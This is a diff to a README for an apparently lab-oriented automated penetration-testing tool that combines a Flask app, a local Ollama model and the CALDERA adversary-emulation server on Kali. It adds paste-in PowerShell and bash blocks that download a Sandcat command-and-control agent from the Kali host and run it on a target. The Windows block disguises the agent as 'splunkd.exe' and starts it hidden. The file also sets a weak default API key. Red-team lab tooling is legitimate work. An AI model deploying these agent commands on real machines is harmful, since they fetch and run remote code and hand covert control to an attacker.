@@ -51,6 +51,77 @@ If running locally on the same machine:
 http://127.0.0.1:5000
 ```
 
+The Flask app now listens on `0.0.0.0` by default, so `http://<kali-ip>:5000`
+works from your host browser or another VM. To force local-only mode:
+
+```bash
+APP_HOST=127.0.0.1 .venv/bin/python app.py
+```
+
+## Full Kali Runbook
+
+Run these from separate terminal tabs because the Flask app, Ollama, and
+CALDERA server are long-running processes.
+
+Terminal 1, install and start AutoPenTest:
+
+```bash
+cd /home/kali/Desktop/AutoPenTest_Recon_Autonomous_Update_v32_8_from_v31
+chmod +x install.sh
+sudo ./install.sh
+cd project
+cp .env.example .env 2>/dev/null || true
+nano .env
+sudo .venv/bin/python app.py
+```
+
+Terminal 2, start Ollama and prepare the model:
+
+```bash
+ollama serve
+```
+
+Terminal 3, pull/check the model while Ollama is running:
+
+```bash
+ollama pull llama3.2:1b
+ollama list
+curl http://127.0.0.1:11434/api/tags
+```
+
+Terminal 4, start CALDERA:
+
+```bash
+cd /path/to/caldera
+source .venv/bin/activate 2>/dev/null || true
+python3 server.py --insecure --host 0.0.0.0
+```
+
+Recommended `project/.env` values for a Kali VM lab:
+
+```bash
+SECRET_KEY=change-me
+DEBUG=false
+APP_HOST=0.0.0.0
+PORT=5000
+
+CALDERA_URL=http://127.0.0.1:8888
+CALDERA_API_KEY=redadmin
+AGENT_GROUP=red
+KALI_IP=CHANGE-THIS-TO-YOUR-KALI-IP
+OPERATION_TIMEOUT=180
+
+OLLAMA_URL=http://127.0.0.1:11434
+OLLAMA_MODEL=llama3.2:1b
+OLLAMA_TIMEOUT=180
+```
+
+To find the Kali IP to put in `KALI_IP`:
+
+```bash
+ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.'
+```
+
 ## Manual Python Setup
 
 ```bash
@@ -162,6 +233,30 @@ Typical flow:
 ```bash
 cd /path/to/caldera
 python3 server.py --insecure
+```
+
+Editable Windows Sandcat deploy block. Paste it into an authorised Windows lab
+target PowerShell session and edit only `CALDERA_SERVER` when your Kali IP
+changes:
+
+```powershell
+# Edit this IP if your Kali VM address changes; it must be reachable from the target.
+$CALDERA_SERVER="http://CHANGE-THIS-TO-YOUR-KALI-IP:8888";
+# Download the official Sandcat payload from CALDERA.
+$url="$CALDERA_SERVER/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url);
+# Replace any old lab Sandcat copy, then start a fresh agent in the red group.
+Get-Process | Where-Object {$_.Modules.FileName -like "C:\Users\Public\splunkd.exe"} | Stop-Process -Force -ErrorAction SilentlyContinue; Remove-Item -Force "C:\Users\Public\splunkd.exe" -ErrorAction SilentlyContinue; [IO.File]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null; Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $CALDERA_SERVER -group red" -WindowStyle Hidden;
+```
+
+Editable Linux Sandcat deploy block:
+
+```bash
+# Edit this IP if your Kali VM address changes; it must be reachable from the target.
+CALDERA_SERVER='http://CHANGE-THIS-TO-YOUR-KALI-IP:8888';
+# Download the official Sandcat payload from CALDERA.
+curl -fsSL -H 'file:sandcat.go' -H 'platform:linux' "$CALDERA_SERVER/file/download" -o sandcat;
+# Start a fresh agent in the red group.
+chmod +x sandcat; ./sandcat -server "$CALDERA_SERVER" -group red
 ```
 
 Then in AutoPenTest:
